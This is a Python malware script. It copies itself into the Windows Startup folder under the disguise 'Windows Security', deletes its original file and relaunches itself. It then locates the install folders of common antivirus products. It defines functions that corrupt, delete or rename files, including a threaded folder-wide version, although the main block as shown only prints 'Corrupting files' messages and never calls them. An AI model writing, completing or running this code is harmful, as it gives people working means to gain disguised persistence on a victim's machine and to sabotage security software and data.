import os
import random
import threading
import string
import sys
import ctypes
import shutil

def copy_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_in_startup = os.path.join(startup_folder, os.path.basename(__file__))
        if not os.path.exists(script_in_startup):
            shutil.copy(script_path, startup_folder)
            _, extension = os.path.splitext(script_path)
            new_name = os.path.join(startup_folder, 'Windows Security' + extension)  
            os.rename(script_in_startup, new_name)
            os.remove(script_path)
            os.system('start "" "{}"'.format(new_name))
            sys.exit()
    except:
        pass
copy_to_startup()
file_lock = threading.Lock()

def find_antivirus_paths():
    antivirus_paths = {}
    antivirus_names = {
        "Windows Defender": "Windows Defender",
        "Avast": "Avast Software",
        "AVG": "AVG",
        "McAfee": "McAfee",
        "Norton": "Norton",
        "Kaspersky": "Kaspersky Lab",
        "Bitdefender": "Bitdefender",
        "Avira": "Avira",
        "ESET": "ESET",
        "Trend Micro": "Trend Micro",
        "Sophos": "Sophos",
        "Malwarebytes": "Malwarebytes",
        "Panda": "Panda Security",
        "Symantec": "Symantec"
    }
    common_directories = [
        "C:\\Program Files",
        "C:\\Program Files (x86)"
    ]
    for name, folder in antivirus_names.items():
        for directory in common_directories:
            if os.path.exists(os.path.join(directory, folder)):
                antivirus_paths[name] = os.path.join(directory, folder)
                break
    return antivirus_paths

def corrupt_file(filename):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
        line_index = random.randint(0, len(lines) - 1)
        line = lines[line_index]
        char_index = random.randint(0, len(line) - 1)
        char = line[char_index]
        corrupted_char = chr(ord(char) ^ 0xFF)
        corrupted_line = line[:char_index] + corrupted_char + line[char_index + 1:]
        lines[line_index] = corrupted_line
        with file_lock:
            with open(filename, 'w') as file:
                file.writelines(lines)
    except Exception as e:
        try:
            os.remove(filename)
        except Exception as e:
            try:
                random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                os.rename(filename, os.path.join(os.path.dirname(filename), random_name))
            except Exception as e:
                pass

def corrupt_files_in_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            corrupt_file(file_path)

def corrupt_files_in_folder_threaded(folder_path):
    threads = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            thread = threading.Thread(target=corrupt_file, args=(file_path,))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    antivirus_paths = find_antivirus_paths()
    if antivirus_paths:
        print("Main folder paths of common antivirus software:")
        for name, path in antivirus_paths.items():
            print(f"{name}: {path}")
        for antivirus_name, folder_path in antivirus_paths.items():
            if os.path.exists(folder_path) and os.path.isdir(folder_path):
                print(f"Corrupting files in '{antivirus_name}' folder: {folder_path}")
            else:
                print(f"Folder '{folder_path}' not found.")
    else:
        print("No common antivirus software found.")
